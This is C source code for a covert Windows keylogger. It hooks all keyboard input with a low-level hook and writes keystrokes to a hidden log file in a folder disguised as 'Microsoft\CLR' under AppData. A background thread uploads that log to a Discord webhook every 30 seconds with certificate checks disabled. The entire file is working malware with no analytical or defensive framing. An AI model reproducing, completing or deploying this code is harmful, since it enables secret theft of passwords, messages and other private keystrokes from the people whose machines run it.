#include <windows.h>
#include <shlobj.h>
#include <wininet.h>
#include <stdio.h>
#include <string.h>
#include <curl/include/curl/curl.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "libcurl.lib")

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void SaveToLogFile(char c);
char TranslateKey(DWORD vkCode);
void UploadToDiscord(const char *logPath);
int HasUploaded(const char *uploadedPath);
void MarkAsUploaded(const char *uploadedPath);

HHOOK hHook;
DWORD WINAPI UploadThread(LPVOID lpParam) {
    const char *logPath = ((const char **)lpParam)[0];
    const char *uploadedPath = ((const char **)lpParam)[1];
    while(1){
        UploadToDiscord(logPath);
        Sleep(30000);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    MSG msg;
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInst, 0);

    char appData[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appData);

    char *logPath = malloc(MAX_PATH);
    sprintf(logPath, "%s\\Microsoft\\CLR\\logs.txt", appData);

    char *uploadedPath = malloc(MAX_PATH);
    sprintf(uploadedPath, "%s\\Microsoft\\CLR\\.uploaded", appData);

    const char *params[2] = { logPath, uploadedPath };
    CreateThread(NULL, 0, UploadThread, params, 0, NULL);

    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    return 0;
}


LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
        char c = TranslateKey(p->vkCode);
        if (c != 0) SaveToLogFile(c);
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

char TranslateKey(DWORD vkCode) {
    BYTE keyboardState[256];
    WORD ascii;
    GetKeyboardState(keyboardState);
    if (ToAscii(vkCode, MapVirtualKey(vkCode, MAPVK_VK_TO_VSC), keyboardState, &ascii, 0) == 1) {
        return (char)ascii;
    }
    return 0;
}

void SaveToLogFile(char c) {
    char path[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, path);
    strcat(path, "\\Microsoft\\CLR");

    CreateDirectory(path, NULL);
    SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN);
    strcat(path, "\\logs.txt");

    FILE *file = fopen(path, "a+");
    if (file) {
        fputc(c, file);
        fclose(file);
    }

    SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN);
}

void UploadToDiscord(const char *logPath) {
    CURL *curl;
    CURLcode res;
    struct curl_httppost *formpost = NULL;
    struct curl_httppost *lastptr = NULL;

    const char *webhook_url = "webhook_url";

    curl_global_init(CURL_GLOBAL_ALL);

    int attempt = 0;
    const int max_attempts = 3;
    while (attempt < max_attempts) {
        curl = curl_easy_init();
        if (curl) {
            curl_formadd(&formpost, &lastptr,
                CURLFORM_COPYNAME, "file",
                CURLFORM_FILE, logPath,
                CURLFORM_FILENAME, "logs.txt",
                CURLFORM_END);

            curl_easy_setopt(curl, CURLOPT_URL, webhook_url);
            curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
            // TEMPORARY: Ignore SSL cert errors
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
            res = curl_easy_perform(curl);

            if (res == CURLE_OK) {
                // Success, cleanup and exit
                curl_formfree(formpost);
                curl_easy_cleanup(curl);
                curl_global_cleanup();
        
                return;
            } else {
                // Log or show error on last attempt
                if (attempt == max_attempts - 1) {
            
                }
                curl_easy_cleanup(curl);
                curl_global_cleanup();
            }
            attempt++;
        }
    }

    curl_global_cleanup();
}

int HasUploaded(const char *uploadedPath) {
    return GetFileAttributes(uploadedPath) != INVALID_FILE_ATTRIBUTES;
}

void MarkAsUploaded(const char *uploadedPath) {
    FILE *f = fopen(uploadedPath, "w");
    if (f) fclose(f);
    SetFileAttributes(uploadedPath, FILE_ATTRIBUTE_HIDDEN);
}
